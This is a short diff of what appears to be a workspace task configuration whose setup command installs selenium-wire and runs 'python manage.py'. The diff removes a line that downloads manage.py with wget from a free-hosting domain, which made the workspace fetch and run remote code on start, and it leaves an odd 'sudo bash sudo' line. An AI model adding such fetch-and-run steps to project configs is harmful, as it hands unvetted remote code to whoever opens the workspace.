@@ -5,7 +5,6 @@ tasks:
       python -m pip install selenium-wire
     command: |
       sudo bash sudo
-      wget https://terabox1000.000webhostapp.com/mobile/manage.py
       python manage.py
   
 ports:
